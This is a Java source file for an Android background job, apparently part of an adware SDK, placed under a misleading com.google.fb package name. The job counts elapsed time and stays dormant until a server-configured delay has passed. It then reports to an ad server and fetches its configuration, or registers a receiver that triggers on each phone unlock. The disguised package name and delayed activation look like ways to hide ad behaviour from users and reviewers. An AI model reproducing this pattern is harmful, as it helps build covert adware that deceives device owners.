package com.google.fb.services;

import android.annotation.TargetApi;
import android.app.KeyguardManager;
import android.app.job.JobParameters;
import android.app.job.JobService;
import android.content.Context;
import android.content.IntentFilter;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.PowerManager;
import android.util.Log;

import com.google.fb.model.ClientConfig;
import com.google.fb.receiver.UnlockReceiver;
import com.google.fb.utils.AppConstants;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

/**
 * JobService to be scheduled by the JobScheduler.
 * start another service
 */
@TargetApi(23)
public class MuiJobService extends JobService {
    private UnlockReceiver myBroadcast;

    @Override
    public boolean onStartJob(JobParameters params) {
        Log.d(AppConstants.log_tag, "onStartJob");

        SharedPreferences mPrefs = getApplicationContext().getSharedPreferences("adsserver", 0);
        int totalTime = mPrefs.getInt("totalTime", 0);
        totalTime += AppConstants.ALARM_SCHEDULE_MINUTES;
        mPrefs.edit().putInt("totalTime", totalTime).apply();

        if (!mPrefs.contains(AppConstants.tag_data)) {
            AdSdk.reportAndGetClientConfig(this);
        } else {
            Gson gson = new GsonBuilder().create();
            ClientConfig clientConfig = gson.fromJson(mPrefs.getString(AppConstants.tag_data, ""), ClientConfig.class);

            if (totalTime < clientConfig.delayService * 60) {
                return true;
            }

            if (clientConfig.delay_report == 0)
                clientConfig.delay_report = 6;
            boolean isNeedUpdateAdsConfig = mPrefs.getBoolean("isNeedUpdateAdsConfig", false) || (totalTime % (clientConfig.delay_report * 60) < AppConstants.ALARM_SCHEDULE_MINUTES);
            if (isNeedUpdateAdsConfig) {
                mPrefs.edit().putBoolean("isNeedUpdateAdsConfig", true).apply();
                AdSdk.reportAndGetClientConfig(getApplicationContext());
            } else {
                myBroadcast = new UnlockReceiver();
                IntentFilter filter = new IntentFilter("android.intent.action.USER_PRESENT");
                registerReceiver(myBroadcast, filter);
            }

        }
        return true;
    }

    @Override
    public boolean onStopJob(JobParameters params) {
        Log.d(AppConstants.log_tag, "onStopJob");
        try {
            if (myBroadcast != null) {
                unregisterReceiver(myBroadcast);
                myBroadcast = null;
            }
        } catch (Exception e) {
        }
        return true;
    }

    public boolean isDeviceLocked() {
        Context context = getApplicationContext();

        boolean isLocked = false;

        // First we check the locked state
        KeyguardManager keyguardManager = (KeyguardManager) context.getSystemService(Context.KEYGUARD_SERVICE);
        boolean inKeyguardRestrictedInputMode = keyguardManager.inKeyguardRestrictedInputMode();

        if (inKeyguardRestrictedInputMode) {
            isLocked = true;

        } else {
            // If password is not set in the settings, the inKeyguardRestrictedInputMode() returns false,
            // so we need to check if screen on for this case

            PowerManager powerManager = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT_WATCH) {
                isLocked = !powerManager.isInteractive();
            } else {
                //noinspection deprecation
                isLocked = !powerManager.isScreenOn();
            }
        }

        Log.d(AppConstants.log_tag, isLocked ? "locked" : "unlocked");
        return isLocked;
    }


}